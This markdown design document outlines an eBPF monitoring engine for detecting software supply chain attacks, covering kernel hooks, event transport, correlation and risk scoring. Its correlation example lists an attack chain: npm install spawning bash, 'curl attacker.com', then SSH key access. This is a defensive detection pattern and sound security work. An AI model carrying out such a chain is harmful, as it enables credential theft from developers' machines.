# Custom eBPF Engine Design

## Objective

Design a lightweight eBPF-based monitoring engine optimized for runtime software supply chain attack detection.

---

## Architecture Overview

```
Kernel Space
     ↓
eBPF Programs
     ↓
BPF Maps
     ↓
Ring Buffer
     ↓
Userspace Collector
     ↓
Behavioral Correlation Engine
     ↓
Risk Scoring Engine
     ↓
Alert System
```

---

## eBPF Sensor Layer

### Process Monitoring

**Hook:** `execve()`

**Captured Data:**
- PID
- PPID
- UID
- Process Name
- Command Line
- Timestamp

### File Monitoring

**Hook:** `openat()`

**Captured Data:**
- Filename
- Process ID
- Access Type
- Timestamp

### Network Monitoring

**Hook:** `tcp_connect()`

**Captured Data:**
- Destination IP
- Destination Port
- Process Context
- Timestamp

---

## Event Transport Layer

### BPF Maps
Used for temporary event storage and kernel-to-userspace communication.

### Ring Buffer
Provides efficient event streaming from kernel space to userspace.

### Userspace Collector
Responsible for:
- Receiving events
- Parsing event data
- Normalizing telemetry
- Forwarding events to detection components

---

## Behavioral Correlation Engine

**Purpose:** Correlate individual events into meaningful attack chains.

**Example:**
```
npm install
     ↓
bash execution
     ↓
curl attacker.com
     ↓
SSH key access
```

**Result:** High-confidence supply chain attack pattern.

---

## Risk Scoring Framework

```
Risk Score = Process Risk + File Risk + Network Risk + Context Risk
```

### Severity Levels

| Score  | Severity |
|--------|----------|
| 0–30   | Low      |
| 31–60  | Medium   |
| 61–80  | High     |
| 81–100 | Critical |

---

## Expected Output

- Runtime alerts
- Risk scores
- MITRE ATT&CK mappings
- Behavioral attack chains
- Security reports
